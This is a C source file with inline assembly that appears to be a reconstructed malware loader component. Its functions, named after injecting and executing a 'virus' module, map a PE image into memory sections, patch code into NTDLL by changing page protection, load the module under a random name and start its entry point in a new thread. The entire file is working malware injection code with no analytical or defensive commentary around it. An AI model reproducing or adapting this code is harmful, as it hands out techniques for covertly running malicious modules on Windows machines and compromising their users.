#include "CodeBlock.h"
#include "AssemblyBlock1.h"
#include "AssemblyBlock2.h"

#include "config.h"

INT32 
BLOCK4_InjectAndExecuteVirus
(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
{
	HANDLE hThread;
	HMODULE pVirusModule;
	HANDLE hMappedAddress;
	INT32 iResult;
	PVIRUS_MODULE_BLOCKS_HEADER pVirusModuleSection;
	PHARDCODED_ADDRESSES pHardAddrs;
	GENERAL_INFO_BLOCK sInfoBlockCopy;

	pVirusModuleSection = (PVIRUS_MODULE_BLOCKS_HEADER)sASMCodeBlocksHeader->VirusModuleSection;
	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
	
	BLOCK4_memcpy(&sInfoBlockCopy, pVirusModuleSection, sizeof(GENERAL_INFO_BLOCK));
	
	sInfoBlockCopy.OriginalAddress = (DWORD)&sInfoBlockCopy ^ X_PTR_KEY;
	sInfoBlockCopy.UnknownZero0 = 0;
	sInfoBlockCopy.AlignAddressesFunction = sASMCodeBlocksHeader->AlignAddresses;
	
	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)pVirusModuleSection->VirusModuleSegment.SegmentAddress, pVirusModuleSection->VirusModuleSegment.SegmentSize);
	if(iResult) return iResult;
	
	iResult = BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs);
	if(iResult) return -4;
	
	pVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);
	if(!pVirusModule) return -9;
	
	pVirusModuleSection->VirusModulePointer = pVirusModule;
	if(pVirusModuleSection->LibraryExecuteEntryNumber != -1)
	{
		hThread = pHardAddrs->CreateThread(NULL, 0x00080000, (LPTHREAD_START_ROUTINE)sASMCodeBlocksHeader->ExecuteLibrary, sASMCodeBlocksHeader, 0, NULL);
		
		if(!hThread) return -13;
		
		pHardAddrs->WaitForSingleObject(hThread, -1);
		pHardAddrs->GetExitCodeThread(hThread, (LPDWORD)&iResult);
	}
	
	hMappedAddress = sInfoBlockCopy.MappedAddress;
	if(sInfoBlockCopy.MappedAddress)
	{
		sInfoBlockCopy.MappedAddress = 0;
		pHardAddrs->ZwClose(hMappedAddress);
	}
	
	pHardAddrs->UnmapViewOfFile(pVirusModuleSection);
	return iResult;
}

INT32 
BLOCK4_ExecuteLibrary
(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
{
	FARPROC pLibraryExecEntry;
	PVIRUS_MODULE_BLOCKS_HEADER pVirusModuleSection;
	PHARDCODED_ADDRESSES pHardAddrs;

	pVirusModuleSection = (PVIRUS_MODULE_BLOCKS_HEADER)sASMCodeBlocksHeader->VirusModuleSection;
	pHardAddrs          = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
	
	pLibraryExecEntry = pHardAddrs->GetProcAddress(pVirusModuleSection->VirusModulePointer, (LPCSTR)pVirusModuleSection->LibraryExecuteEntryNumber);
	
	if(pLibraryExecEntry)
	{
		((__tLibraryExecEntry)pLibraryExecEntry)((LPVOID)pVirusModuleSection->UnknownSegment.SegmentAddress, pVirusModuleSection->UnknownSegment.SegmentSize);
		return 0;
	}
	
	pHardAddrs->FreeLibrary(pVirusModuleSection->VirusModulePointer);
	return 0;
}

void 
BLOCK4_CopyPEHeaderInfo
(PGENERAL_INFO_BLOCK sInfoBlock,
PIMAGE_NT_HEADERS pImageNT,
INT32 iVirusModuleSize)
{
	sInfoBlock->AbsoluteEntryPoint = pImageNT->OptionalHeader.ImageBase + pImageNT->OptionalHeader.AddressOfEntryPoint;
	sInfoBlock->UnknownZero1 = 0;
	sInfoBlock->SizeOfStackReserve = pImageNT->OptionalHeader.SizeOfStackReserve;
	sInfoBlock->SizeOfStackCommit = pImageNT->OptionalHeader.SizeOfStackCommit;
	sInfoBlock->Subsystem = pImageNT->OptionalHeader.Subsystem;
	sInfoBlock->MinorSubsystemVersion = pImageNT->OptionalHeader.MinorSubsystemVersion;
	sInfoBlock->MajorSubsystemVersion = pImageNT->OptionalHeader.MajorSubsystemVersion;
	sInfoBlock->UnknownZero2 = 0;
	sInfoBlock->Charactersitics = pImageNT->FileHeader.Characteristics;
	sInfoBlock->DllCharacteristics = pImageNT->OptionalHeader.DllCharacteristics;
	sInfoBlock->Machine = pImageNT->FileHeader.Machine;
	sInfoBlock->UnknownOne = 1;
	sInfoBlock->UnknownFour = 4;
	sInfoBlock->LoaderFlags = pImageNT->OptionalHeader.LoaderFlags;
	sInfoBlock->VirusModuleSize = iVirusModuleSize;
	sInfoBlock->UnknownZero3 = 0;
}

NTSTATUS 
BLOCK4_AlignAddresses
(PIMAGE_DOS_HEADER *pImageDOS)
{
	DWORD *dwItemAddress;
	WORD *wTypeOffset;
	UINT32 iDeltaSizeOfBlock;
	UINT32 j;
	PIMAGE_NT_HEADERS pImageNT;
	DWORD pImageBaseDelta;
	DWORD pImageBase;
	PIMAGE_BASE_RELOCATION i;

	if(!pImageDOS || !*pImageDOS)
		return STATUS_ACCESS_VIOLATION;
	
	pImageBase = (DWORD)pImageDOS;
	if((*pImageDOS)->e_magic != MZ_HEADER)
		return STATUS_ACCESS_VIOLATION;
	
	pImageNT = (PIMAGE_NT_HEADERS)(pImageBase + (*pImageDOS)->e_lfanew);
	pImageBaseDelta = (DWORD)(pImageBase - pImageNT->OptionalHeader.ImageBase);
	
	if(pImageBase == pImageNT->OptionalHeader.ImageBase)
		return STATUS_SUCCESS;
	
	pImageNT->OptionalHeader.ImageBase = pImageBase;
	if(!pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
		return STATUS_CONFLICTING_ADDRESSES;
	
	for(i = (PIMAGE_BASE_RELOCATION)(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pImageBase); i->SizeOfBlock; i += i->SizeOfBlock/sizeof(IMAGE_BASE_RELOCATION))
	{
		iDeltaSizeOfBlock = i->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION);
		wTypeOffset = (WORD *)(i + 1);
		
		if(iDeltaSizeOfBlock % 2)
			return STATUS_CONFLICTING_ADDRESSES;
		
		for(j = 0; j < iDeltaSizeOfBlock / 2; ++j)
		{
			if((UINT8)((*wTypeOffset / 0x100) / 0x10) != IMAGE_REL_BASED_ABSOLUTE)
			{
				if((UINT8)((*wTypeOffset / 0x100) / 0x10) != IMAGE_REL_BASED_HIGHLOW)
					return STATUS_CONFLICTING_ADDRESSES;
				
				dwItemAddress = (DWORD *)((*wTypeOffset & 0x0FFF) + i->VirtualAddress + pImageBase);
				*dwItemAddress += pImageBaseDelta;
			}
			
			wTypeOffset++;
		}
	}
	
	return 0;
}

__declspec(naked) 
void 
BLOCK4_memcpy
(void *pDestination,
 const void *pSource,
 unsigned int iSize)
{
	__asm {
		push    ebp
		mov     ebp, esp
		push    esi
		push    edi
		mov     edi, pDestination
		mov     esi, pSource
		mov     ecx, iSize
		rep movsb
		pop     edi
		pop     esi
		pop     ebp
		retn
	}
}

void 
BLOCK4_CopyDataIntoMapView
(PVOID pVirusModule,
 PIMAGE_NT_HEADERS pImageNT,
 LPVOID pMapViewOfFile)
{
	INT32 dwNumberOfSections;
	PIMAGE_SECTION_HEADER pImageSections;
	INT32 dwCurrentSection;

	dwNumberOfSections = pImageNT->FileHeader.NumberOfSections;
	BLOCK4_memcpy(pMapViewOfFile, pVirusModule, pImageNT->OptionalHeader.SizeOfHeaders);
	pImageSections = (PIMAGE_SECTION_HEADER)((DWORD)pImageNT + pImageNT->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD));
	
	for(dwCurrentSection = 0; dwCurrentSection < dwNumberOfSections; dwCurrentSection++, pImageSections++)
	{
		if(pImageSections->SizeOfRawData)
			BLOCK4_memcpy((void *)((DWORD)pMapViewOfFile + pImageSections->VirtualAddress), (const void *)((DWORD)pVirusModule + pImageSections->PointerToRawData), pImageSections->SizeOfRawData);
	}
}

INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, PHARDCODED_ADDRESSES pHardAddrs)
{
	HMODULE hHandleNTDLL;
	void *v4;
	DWORD dwOld;

	hHandleNTDLL = pHardAddrs->NTDLL_DLL;
	if(!pHardAddrs->NTDLL_DLL) return 0;
	
	v4 = (void *)(hHandleNTDLL + 16);
	if(*(_DWORD *)(hHandleNTDLL + 16) == 0xAB49103B) return 0;
	
	if(pHardAddrs->VirtualProtect(hHandleNTDLL, 0x1000, PAGE_EXECUTE_WRITECOPY, &dwOld))
	{
		BLOCK4_memcpy(v4, (const void *)sASMCodeBlocksHeader->ASMBlock0Segment.SegmentAddress, sASMCodeBlocksHeader->ASMBlock0Segment.SegmentSize); // inject the code
		((void (__thiscall *)(void *))sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress)(v4); // __thiscall ignored by compiler
		pHardAddrs->FlushInstructionCache((HANDLE)-1, NULL, 0);
		
		return 0;
	}
	
	return -4;
}

INT32 
BLOCK4_LoadVirusModuleInfo
(PHARDCODED_ADDRESSES pHardAddrs,
 GENERAL_INFO_BLOCK *sInfoBlock,
 PVOID pVirusModule,
 INT32 iVirusModuleSize)
{
	PIMAGE_NT_HEADERS pImageNT;
	LARGE_INTEGER liMaximumSize;
	NTSTATUS iStatus;
	LPVOID pMapViewOfFile;
	HANDLE hSectionHandle;
	PIMAGE_DOS_HEADER pImageDOS;

	sInfoBlock->MappedAddress = 0;
	pImageDOS = (PIMAGE_DOS_HEADER)pVirusModule;
	
	if(((PIMAGE_DOS_HEADER)pVirusModule)->e_magic != MZ_HEADER) return -2;
	
	pImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusModule + pImageDOS->e_lfanew);
	if(pImageNT->Signature != PE_HEADER) return -2;
	
	liMaximumSize.LowPart  = pImageNT->OptionalHeader.SizeOfImage;
	liMaximumSize.HighPart = 0;
	
	iStatus = pHardAddrs->ZwCreateSection(&hSectionHandle, SECTION_ALL_ACCESS, 0, &liMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
	if(iStatus != STATUS_SUCCESS) return -11;
	
	pMapViewOfFile = pHardAddrs->MapViewOfFile(hSectionHandle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
	if(!pMapViewOfFile)
	{
		pHardAddrs->ZwClose(hSectionHandle);
		return -10;
	}
	
	sInfoBlock->MappedAddress = hSectionHandle;
	BLOCK4_CopyDataIntoMapView(pVirusModule, pImageNT, pMapViewOfFile);
	BLOCK4_CopyPEHeaderInfo(sInfoBlock, pImageNT, iVirusModuleSize);
	
	pHardAddrs->UnmapViewOfFile(pMapViewOfFile);
	
	return 0;
}

void BLOCK4_END(void)
{
	;
}